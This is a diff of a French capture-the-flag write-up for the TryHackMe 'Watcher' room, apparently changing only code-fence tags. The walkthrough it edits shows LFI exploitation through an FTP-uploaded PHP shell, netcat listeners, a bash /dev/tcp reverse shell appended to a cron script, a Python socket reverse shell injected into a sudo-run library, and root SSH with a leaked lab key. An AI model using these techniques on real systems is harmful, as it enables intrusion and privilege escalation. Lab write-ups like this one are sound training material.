@@ -5,7 +5,7 @@ Une room fort sympatique. Elle permet d'exploiter un panel varier d'exploit. Tr�
 
 # Enum :
 ## Nmap
-```   
+```sh   
 # Nmap 7.94 scan initiated Wed Oct 25 07:35:07 2023 as: nmap -sC -sV -p- -oN nmap.txt 10.10.114.38
 Nmap scan report for 10.10.114.38
 Host is up (0.036s latency).
@@ -53,7 +53,7 @@ Hi Mat, The credentials for the FTP server are below. I've set the files to be s
 ```
 Nous avond donc des creds pour le FTP !
 Et on y trouve le flag 2 !
-```
+```sh
 ftp> ls -la
 229 Entering Extended Passive Mode (|||48556|)
 150 Here comes the directory listing.
@@ -69,7 +69,7 @@ FLAG{ftp_***_***_me}
 # Flag 3
 On sait que le site est vulnérable au LFI, nous savons aussi que le FTP pointe sur **/home/ftpuser/ftp/files**
 On va tenter d'upload un shell et de l'avoir avec la LFI.
-```
+```sh
 ftp> put rshell.php
 local: rshell.php remote: rshell.php
 229 Entering Extended Passive Mode (|||44821|)
@@ -83,7 +83,7 @@ On va ensuite sur l'url qui pointe vers le rshell:
 http://10.10.114.38/post.php?post=/home/ftpuser/ftp/files/rshell.php
 ```
 Et voici le reverseshell:
-```
+```sh
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 4444                              
 listening on [any] 4444 ...
@@ -96,7 +96,7 @@ uid=33(www-data) gid=33(www-data) groups=33(www-data)
 $
 ```
 On stabilise le shell :
-```
+```sh
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 export TERM=xterm
 -> CTRL+Z
@@ -125,7 +125,7 @@ I've got the cron jobs set up now so don't worry about getting that done.
 Mat
 ```
 et effectivement, un script s'execute dans une tâche cron :
-```
+```sh
 www-data@watcher:/home/toby/jobs$ cat /etc/crontab
 # /etc/crontab: system-wide crontab
 # Unlike any other crontab you don't have to run the `crontab'
@@ -145,13 +145,13 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 */1 * * * * mat /home/toby/jobs/cow.sh
 ```
 Le script :
-```
+```sh
 www-data@watcher:/home/toby/jobs$ cat cow.sh 
 #!/bin/bash
 cp /home/mat/cow.jpg /tmp/cow.jpg
 ```
 En regardant les droits sudo, on vois ca :
-```
+```sh
 www-data@watcher:/home/toby$ sudo -l
 Matching Defaults entries for www-data on watcher:
     env_reset, mail_badpass,
@@ -171,7 +171,7 @@ FLAG{****_life*****}
 ```
 # Flag 5
 On va ajouter un revshell dans le script **cow.sh** pour récupèrer le compte de mat.
-```
+```sh
 toby@watcher:~/jobs$ echo "/bin/bash -i >& /dev/tcp/{IP}/1234 0>&1" >> cow.sh
 toby@watcher:~/jobs$ 
 toby@watcher:~/jobs$ cat cow.sh 
@@ -181,7 +181,7 @@ cp /home/mat/cow.jpg /tmp/cow.jpg
 toby@watcher:~/jobs$ 
 ```
 Plus qu'a attendre que la tâche cron execute le script et voila !
-```
+```sh
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 1234                              
 listening on [any] 1234 ...
@@ -205,7 +205,7 @@ I've set up your sudo rights to use the python script as my user. You can only r
 Will
 ```
 On sait donc qu'il peux executer un script:
-```
+```sh
 mat@watcher:~$ sudo -l
 Matching Defaults entries for mat on watcher:
     env_reset, mail_badpass,
@@ -216,8 +216,6 @@ User mat may run the following commands on watcher:
 ```
 Il y a 2 scripts:
 ```cmd.py
-mat@watcher:~/scripts$ cat cmd.py
-cat cmd.py
 def get_command(num):
         if(num == "1"):
                 return "ls -lah"
@@ -227,7 +225,6 @@ def get_command(num):
                 return "cat /etc/passwd"
 ```
 ```will_script.py
-mat@watcher:~/scripts$ cat will_script.py
 import os
 import sys
 from cmd import get_command
@@ -244,8 +241,7 @@ os.system(cmd)
 ```
 On peux modifier le fichier cmd.py qui sert de lib pour le script de will.
 On va donc modifier cette lib et y ajouter un revershell.
-```
-mat@watcher:~/scripts$ cat cmd.py
+```cmd.py
 import socket,subprocess,os
 s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 s.connect(("{IP}",5555))
@@ -257,11 +253,11 @@ import pty
 pty.spawn("/bin/bash")
 ```
 Ensuite, on execute le script (Sans oublier de démarrer le listener !)
-```
+```sh
 sudo -u will /usr/bin/python3 /home/mat/scripts/will_script.py 3
 ```
 Et nous voila en tant que will !
-```
+```sh
 ┌──(kali㉿kali)-[~]
 └─$ nc -lnvp 5555                              
 listening on [any] 5555 ...
@@ -337,7 +333,7 @@ mEGDGwKBgQCh+UpmTTRx4KKNy6wJkwGv2uRdj9rta2X5pzTq2nEApke2UYlP5OLh
 -----END RSA PRIVATE KEY-----
 ```
 On peux ensuite se connecté en SSH, et comme la config de SSH permet le login en tant que root, on peux donc directement se connecté en root avec la clé :
-```
+```sh
 ┌──(kali㉿kali)-[~/Challenge/TryHackMe/Watcher]
 └─$ ssh -i id_rsa root@10.10.114.38
 Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-128-generic x86_64)
